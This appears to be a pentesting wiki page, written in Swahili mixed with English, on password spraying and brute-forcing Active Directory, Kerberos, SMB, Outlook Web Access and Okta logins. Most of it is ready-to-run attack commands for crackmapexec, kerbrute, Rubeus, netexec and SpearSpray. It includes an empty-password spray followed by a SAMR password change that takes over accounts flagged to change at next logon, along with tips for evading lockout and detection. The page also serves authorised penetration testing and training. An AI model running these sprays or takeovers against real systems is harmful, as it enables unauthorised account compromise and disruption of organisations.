# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Mara tu unapopata kadhaa za **valid usernames**, unaweza kujaribu **common passwords** za kawaida zaidi (kumbuka password policy ya mazingira) kwa kila mtumiaji uliogunduliwa.\
Kwa **default** the **minimum** **password** **length** ni **7**.

Orodha za **common usernames** pia zinaweza kuwa muhimu: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Kumbuka kwamba **could lockout some accounts if you try several wrong passwords** (kwa default zaidi ya 10).

### Pata password policy

Kama una baadhi ya **user credentials** au **shell** kama **domain user** unaweza **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation kutoka Linux (au zote)

- Kutumia **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Kutumia [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(unaweza kuonyesha idadi ya majaribio ili kuepuka kufungiwa):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Kutumia [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - HAIPENDEKEZWI, WAKATI MINGINE HAIFANYI KAZI
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Kwa kutumia module ya `scanner/smb/smb_login` ya **Metasploit**:

![](<../../images/image (745).png>)

- Kwa kutumia **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Kutoka Windows

- Kwa [Rubeus](https://github.com/Zer1t0/Rubeus) toleo lenye brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Kwa kutumia [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Inaweza kuzalisha watumiaji kutoka kwenye domain kwa chaguo-msingi na itapata sera ya nywila kutoka kwenye domain na kupunguza majaribio kulingana nayo):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Kwa kutumia [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Tambua na Uchukue Udhibiti wa Akaunti "Nywila lazima ibadilishwe wakati wa kuingia ufuatao" (SAMR)

Mbinu yenye kelele ndogo ni kufanya spray password isiyo hatari/tupu na kugundua akaunti zinazorejesha STATUS_PASSWORD_MUST_CHANGE, ambayo inaonyesha kuwa password ilitimizwa kwa nguvu na inaweza kubadilishwa bila kujua password ya zamani.

Workflow:
- Orodhesha watumiaji (RID brute via SAMR) ili kujenga orodha ya malengo:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray password tupu na endelea kwenye hits ili kunasa akaunti ambazo zinatakiwa kubadilisha password zao wakati wa next logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Kwa kila hit, badilisha password kupitia SAMR kwa kutumia NetExec’s module (hakuna old password inahitajika wakati "must change" imewekwa):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Vidokezo vya uendeshaji:
- Hakikisha saa ya mwenyeji wako iko sawa na ile ya DC kabla ya Kerberos-based operations: `sudo ntpdate <dc_fqdn>`.
- [+] bila (Pwn3d!) katika baadhi ya moduli (kwa mfano, RDP/WinRM) inamaanisha creds ni halali lakini akaunti haina interactive logon rights.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying inapunguza kelele ikilinganishwa na SMB/NTLM/LDAP bind attempts na inaleta ulinganifu mzuri zaidi na AD lockout policies. SpearSpray inaunganisha LDAP-driven targeting, pattern engine, na ufahamu wa sera (domain policy + PSOs + badPwdCount buffer) kufanya spraying kwa usahihi na kwa usalama. Pia inaweza ku-tag principals zilizodukuliwa katika Neo4j kwa BloodHound pathing.

Key ideas:
- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
- Domain lockout policy + PSO-aware filtering ili kuacha buffer ya majaribio inayoweza kusanidiwa (threshold) na kuepuka kufunga watumiaji.
- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
- Throughput control with threads, jitter, and max requests per second.
- Optional Neo4j integration to mark owned users for BloodHound.

Matumizi ya msingi na ugunduzi:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Kulenga na udhibiti wa muundo:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Vidhibiti vya usiri na usalama:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Uboreshaji wa Neo4j/BloodHound:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Muhtasari wa mfumo wa patterns (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Muda kutoka kwa pwdLastSet ya kila mtumiaji (au whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Vifaa vya muundo na tokeni ya shirika: {separator}, {suffix}, {extra}

Vidokezo vya uendeshaji:
- Pendelea kuwasilisha maswali kwa PDC-emulator kwa kutumia -dc ili kusoma badPwdCount na taarifa za sera zinazoaminika zaidi.
- Urejeshaji wa badPwdCount unaanzishwa kwenye jaribio linalofuata baada ya dirisha la uchunguzi; tumia kizingiti na upangaji wa wakati ili kuwa salama.
- Majaribio ya Kerberos pre-auth yanaonekana kama 4768/4771 katika DC telemetry; tumia jitter na rate-limiting ili kuendana na trafiki ya kawaida.

> Kidokezo: Saizi ya ukurasa wa LDAP inayotumika kwa SpearSpray ni 200; rekebisha kwa -lps inapohitajika.

## Outlook Web Access

Kuna zana nyingi za p**assword spraying outlook**.

- Kwa [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Kwa [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Kwa [Ruler](https://github.com/sensepost/ruler) (inayotegemewa!)
- Kwa [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Kwa [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Ili kutumia zana yoyote kati ya hizi, unahitaji orodha ya watumiaji na password / a small list of passwords to spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Marejeleo

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
